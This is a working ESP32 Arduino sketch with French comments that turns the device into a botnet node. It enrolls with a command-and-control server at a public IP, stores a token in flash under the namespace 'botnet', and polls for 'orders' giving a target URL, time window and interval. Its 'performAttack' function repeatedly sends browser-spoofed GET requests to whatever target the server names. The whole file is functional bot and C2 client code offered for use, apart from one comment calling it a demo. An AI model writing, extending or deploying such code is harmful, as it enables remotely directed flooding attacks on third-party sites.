#include <WiFi.h>
#include <HTTPClient.h>
#include <ArduinoJson.h>
#include <Preferences.h> // Pour la mémoire morte (NVS)
#include <time.h>

// --- CONFIGURATION ---
const char* ssid     = "WIFI_NAME";
const char* password = "WIFI_PASS";

// IP PUBLIQUE DE TON SERVEUR API (Port 5000 ouvert)
String serverBase = "http://82.XXX.XXX.XXX:5000/api"; 

// --- VARIABLES ---
Preferences preferences; // Objet pour la mémoire
String myToken = "";     // Le mot de passe unique de cet ESP

// Variables de mission
bool active = false;
String targetUrl = "";
int startH=0, startM=0, stopH=0, stopM=0, interval=60;
unsigned long lastHeartbeat = 0;
unsigned long lastAttack = 0;

// NTP
const char* ntpServer = "pool.ntp.org";

void setup() {
  Serial.begin(115200);
  
  // 1. WiFi
  WiFi.begin(ssid, password);
  while(WiFi.status() != WL_CONNECTED) { delay(500); Serial.print("."); }
  Serial.println("\nWiFi OK");

  // 2. Initialiser la mémoire et récupérer le Token
  preferences.begin("botnet", false); // Espace de nom "botnet"
  myToken = preferences.getString("token", ""); // Récupère le token, ou "" si vide
  
  if (myToken == "") {
    Serial.println(">>> PREMIER DEMARRAGE : Enregistrement auprès du QG...");
    registerDevice();
  } else {
    Serial.println(">>> SOLDAT IDENTIFIÉ. Token: " + myToken);
  }

  // 3. Heure
  configTime(3600, 3600, ntpServer);
}

void loop() {
  // Si WiFi coupé, on reconnecte
  if(WiFi.status() != WL_CONNECTED) { WiFi.reconnect(); return; }

  // --- HEARTBEAT / MISE A JOUR DES ORDRES ---
  // On envoie le ping toutes les "interval" secondes (par défaut 60 au début)
  // Utilise un timer non-bloquant
  if (millis() - lastHeartbeat > (interval * 1000) || lastHeartbeat == 0) {
    sendHeartbeat();
    lastHeartbeat = millis();
  }

  // --- EXECUTION DE LA MISSION ---
  if (active) {
    struct tm t;
    if(getLocalTime(&t)) {
      int now = t.tm_hour*60 + t.tm_min;
      int start = startH*60 + startM;
      int stop = stopH*60 + stopM;
      
      // Logique horaire
      bool timeOK = (start < stop) ? (now >= start && now < stop) : (now >= start || now < stop);

      // Si c'est l'heure et que l'intervalle d'attaque est passé
      if (timeOK && (millis() - lastAttack > (interval * 1000))) {
        performAttack();
        lastAttack = millis();
      }
    }
  }
  
  delay(100);
}

// --- FONCTION 1 : ENRÔLEMENT (Première fois) ---
void registerDevice() {
  HTTPClient http;
  http.begin(serverBase + "/register");
  
  // POST vide, juste pour dire "Coucou je suis nouveau"
  int httpResponseCode = http.POST("{}"); 
  
  if (httpResponseCode == 200) {
    String response = http.getString();
    DynamicJsonDocument doc(1024);
    deserializeJson(doc, response);
    
    String newToken = doc["token"].as<String>();
    
    // SAUVEGARDE EN MÉMOIRE MORTE
    preferences.putString("token", newToken);
    myToken = newToken;
    
    Serial.println(">>> ENREGISTREMENT REUSSI ! Token sauvegardé.");
  } else {
    Serial.printf("Erreur Register: %d. Réessai dans 5s...\n", httpResponseCode);
    delay(5000);
    registerDevice(); // Récursif (dangereux si boucle infinie, mais ok pour démo)
  }
  http.end();
}

// --- FONCTION 2 : HEARTBEAT (Envoi Token -> Reçoit Ordres) ---
void sendHeartbeat() {
  HTTPClient http;
  http.begin(serverBase + "/heartbeat");
  http.addHeader("Content-Type", "application/json");
  
  // On envoie le Token en JSON
  String payload = "{\"token\":\"" + myToken + "\"}";
  int code = http.POST(payload);
  
  if (code == 200) {
    String response = http.getString();
    DynamicJsonDocument doc(2048);
    deserializeJson(doc, response);
    
    // Lecture des ordres imbriqués dans l'objet "orders"
    JsonObject orders = doc["orders"];
    active = orders["active"];
    targetUrl = orders["target_url"].as<String>();
    startH = orders["start_h"]; startM = orders["start_m"];
    stopH = orders["stop_h"]; stopM = orders["stop_m"];
    
    // L'intervalle sert à la fois pour le Heartbeat et l'Attaque
    int newInterval = orders["interval"];
    if (newInterval > 5) interval = newInterval; // Sécurité min 5s

    Serial.println(">>> Heartbeat OK. Ordres mis à jour.");
  } else if (code == 403) {
    Serial.println("!!! TOKEN REJETÉ PAR LE QG !!!");
    // Optionnel : preferences.putString("token", ""); pour forcer un ré-enregistrement
  } else {
    Serial.printf("Erreur Heartbeat: %d\n", code);
  }
  http.end();
}

// --- FONCTION 3 : ATTAQUE ---
void performAttack() {
  if (targetUrl == "") return;
  HTTPClient http;
  http.begin(targetUrl);
  // Simulation d'un navigateur
  http.setUserAgent("Mozilla/5.0 (Windows NT 10.0; Win64; x64)"); 
  int code = http.GET();
  Serial.printf("TIR SUR CIBLE -> Code: %d\n", code);
  http.end();
}